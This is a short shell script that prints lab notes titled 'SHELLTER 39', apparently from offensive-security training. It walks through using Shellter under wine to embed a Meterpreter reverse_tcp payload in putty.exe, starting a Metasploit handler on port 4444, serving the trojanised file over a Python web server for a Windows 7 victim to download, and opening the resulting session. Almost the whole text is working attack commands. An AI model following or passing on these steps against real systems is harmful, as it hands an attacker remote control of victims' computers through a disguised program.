echo '
--] SHELLTER 39

OPERATOR   === KALI               IP === 132
TANGO      === WIN 7              IP === 134
LAB        === NET                ALL === 172.16.14.IP


OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> apt update
OPERATOR    ==> TASK ==> Download putty.exe in /home/kali/Downloads/
OPERATOR    ==> TASK ==> apt install shellter || wget shellter from github
OPERATOR    ==> TASK ==> dpkg --add-architecture i386 && apt update && apt install wine32
OPERATOR    ==> TASK ==> wine shellter
OPERATOR    ==> TASK ==> A
OPERATOR    ==> TASK ==> /root/putty.exe
OPERATOR    ==> TASK ==> Y
OPERATOR    ==> TASK ==> L
OPERATOR    ==> TASK ==> 1
OPERATOR    ==> TASK ==> IP_OPERATOR
OPERATOR    ==> TASK ==> 4444
OPERATOR    ==> TASK ==> CTRL Z

OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use exploit/multi/handler
OPERATOR    ==> TASK ==> set payload windows/meterpreter/reverse_tcp
OPERATOR    ==> TASK ==> set lhost IP_OPERATOR
OPERATOR    ==> TASK ==> set lport 4444
OPERATOR    ==> TASK ==> exploit -j

OPERATOR    ==> TASK ==> cd /home/kali/Downloads/
OPERATOR    ==> TASK ==> python3 -m http.server 80
TANGO       ==> TASK ==> internet explorer go http://IP_OPERATOR/putty.exe

OPERATOR    ==> TASK ==> session -i 1

'
read